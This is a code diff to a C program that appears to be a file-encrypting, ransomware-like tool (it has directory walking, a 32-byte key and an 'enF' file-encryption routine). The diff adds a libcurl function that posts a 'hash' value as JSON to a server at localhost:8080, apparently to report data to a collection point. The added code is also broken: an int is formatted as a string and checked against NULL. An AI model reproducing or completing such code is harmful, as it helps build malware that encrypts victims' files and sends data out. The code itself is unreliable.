@@ -6,9 +6,42 @@
 #include <dirent.h>
 #include <sys/stat.h>
 #include <unistd.h>
+#include <curl/curl.h>
 
 #define KEY_SIZE 32
 #define BLOCK_SIZE 16
+
+void post(int hash)
+{
+    CURL *curl;        // handle
+    CURLcode response; // codigo de retorno da func curl_easy_perform()
+
+    char json[500];
+
+    curl = curl_easy_init();
+    if (curl && hash != NULL)
+    {
+        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/"); // configura opções no handle
+        snprintf(json, sizeof(json), "{\"hash\":\"%s\"}", hash);       // construção do json
+
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers); // montagem do header
+
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json); // montagem do post
+    }
+
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // func de callback pra escrever os dados da resposta(o null sig
+    // nifica que ira escrever direto na func padrão(CURLOPT_WRITEDATA))
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout); // aqui dizemos que a func de resposta escrevera no terminal(stdout)
+
+    response = curl_easy_perform(curl);
+
+    if (response != CURLE_OK)
+        fprintf(stderr, "Erro: %s\n", curl_easy_strerror(response));
+
+    curl_easy_cleanup(curl);
+}
 
 void enF(const char *filename, const unsigned char *key, const unsigned char *iv) // cript file
 {
